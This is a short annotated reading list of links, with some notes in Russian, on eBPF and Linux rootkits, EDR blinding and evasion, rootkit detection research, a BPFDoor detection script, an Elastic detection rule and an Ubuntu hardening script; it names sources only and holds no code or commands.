- assumed-breach.com — eBPF rootkits: how Linux EDR gets blinded (канарейки): https://www.assumed-breach.com/blog/ebpf
- ACM COSE — Kernel-level hidden rootkit detection based on eBPF (2025): https://dl.acm.org/doi/10.1016/j.cose.2025.104582
- Virus Bulletin 2025 — Unmasking the unseen: modern Linux rootkits (Elastic): https://www.virusbulletin.com/conference/vb2025/abstracts/unmasking-unseen-deep-dive-modern-linux-rootkits-and-their-detection
- Qualys — BPFDoor detection script: https://blog.qualys.com/vulnerabilities-threat-research/2022/08/01/heres-a-simple-script-to-detect-the-stealthy-nation-state-bpfdoor
- Zscaler — What Is eBPF? Linux Malware Risks: https://www.zscaler.com/blogs/cybersecurity-best-practices/ebpf-malware
- Wiz — Linux rootkits explained, ч.1 (dynamic linker hijacking): https://www.wiz.io/blog/linux-rootkits-explained-part-1-dynamic-linker-hijacking
- arXiv — User-space library rootkits revisited (2025): https://arxiv.org/html/2506.07827v1
- Elastic — BPF Program Tampering via bpftool (правило детекта): https://www.elastic.co/guide/en/security/8.19/bpf-program-tampering-via-bpftool.html
- The Gray Node — bpftool introduction (порядок detach): https://thegraynode.io/posts/bpftool_introduction
- Vectra — EDR evasion: techniques and defenses: https://www.vectra.ai/topics/edr-evasion
- gensecaihq/Ubuntu-Security-Hardening-Script (Ubuntu 24.04, DISA-STIG): https://github.com/gensecaihq/Ubuntu-Security-Hardening-Script